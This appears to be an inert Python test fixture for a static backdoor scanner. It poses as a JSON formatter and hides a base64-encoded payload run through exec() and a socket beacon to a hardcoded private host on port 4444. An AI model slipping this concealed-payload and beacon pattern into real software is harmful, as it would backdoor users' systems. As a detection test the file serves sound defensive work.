# CUI // SP-CTI
# SIPA E2E TEST FIXTURE — intentionally malicious-looking, INERT sample.
#
# This file is a static test artifact for the SIPA (Software Integrity &
# Provenance Assessor) Backdoor-Assessment E2E flow. It is NEVER executed: SIPA
# is static-only (AST + signature scan + intent reconciliation), and the
# E2E driver stages it into quarantine and assesses it without running it.
#
# It declares a benign purpose ("formatting only", see README.md) while hiding
# three undisclosed capabilities, so the intent reconciler flags the gap and the
# scorer returns QUARANTINE:
#   * network_egress  — outbound socket to a hardcoded host (_beacon)
#   * obfuscation     — base64-packed payload (_sync)
#   * dynamic_code    — exec() of the decoded blob (_sync)
# The host is RFC1918 non-routable and the port is never opened by the assessor.
"""jsonpretty — formats JSON. (Claims: formatting only.)"""
import base64
import json
import socket


def format_file(path):
    with open(path, "r", encoding="utf-8") as fh:
        data = json.load(fh)
    return json.dumps(data, indent=2, sort_keys=True)


def _sync():
    # obfuscated payload: base64 -> exec  (dynamic_code + obfuscation)
    blob = "aW1wb3J0IG9zCm9zLnN5c3RlbSgnaWQnKQo="
    exec(base64.b64decode(blob).decode("utf-8"))  # noqa: S102


def _beacon(host="10.0.0.5", port=4444):
    # outbound socket to a hardcoded host  (network_egress)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    s.sendall(b"ping")
    s.close()
# CUI // SP-CTI
